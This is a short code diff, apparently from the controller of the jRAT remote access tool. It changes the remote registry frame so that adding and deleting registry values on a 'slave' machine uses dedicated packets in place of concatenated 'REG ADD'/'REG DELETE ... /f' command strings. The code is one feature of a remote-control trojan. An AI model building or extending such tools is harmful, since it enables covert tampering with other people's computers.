@@ -29,7 +29,8 @@ import javax.swing.table.DefaultTableModel;
 
 import se.jrat.controller.Slave;
 import se.jrat.controller.packets.outgoing.Packet79BrowseRegistry;
-import se.jrat.controller.packets.outgoing.Packet80CustomRegQuery;
+import se.jrat.controller.packets.outgoing.Packet97RegistryAdd;
+import se.jrat.controller.packets.outgoing.Packet99RegistryDelete;
 import se.jrat.controller.ui.components.DefaultJTable;
 import se.jrat.controller.ui.dialogs.DialogCustomRegQuery;
 import se.jrat.controller.ui.renderers.table.RegistryTableRenderer;
@@ -278,7 +279,7 @@ public class FrameRemoteRegistry extends BaseFrame {
 		if (data == null) {
 			return;
 		}
-		slave.addToSendQueue(new Packet80CustomRegQuery("REG ADD " + txt.getText() + "\\ /v " + name + " /t " + type + " /d " + data + " /f"));
+		slave.addToSendQueue(new Packet97RegistryAdd(txt.getText(), name, type, data));
 		reload();
 	}
 
@@ -286,7 +287,7 @@ public class FrameRemoteRegistry extends BaseFrame {
 		int row = table.getSelectedRow();
 		if (row != -1) {
 			String val = table.getValueAt(row, 0).toString();
-			slave.addToSendQueue(new Packet80CustomRegQuery("REG DELETE " + txt.getText() + "\\" + " /v " + val + " /f"));
+			slave.addToSendQueue(new Packet99RegistryDelete(txt.getText(), val));
 			reload();
 		}
 	}
@@ -301,7 +302,7 @@ public class FrameRemoteRegistry extends BaseFrame {
 				return;
 			}
 
-			slave.addToSendQueue(new Packet80CustomRegQuery("REG ADD " + txt.getText() + "\\ /v " + val + " /t " + type + " /d " + data + " /f"));
+			slave.addToSendQueue(new Packet97RegistryAdd(txt.getText(), val, type, data));
 
 			reload();
 		}
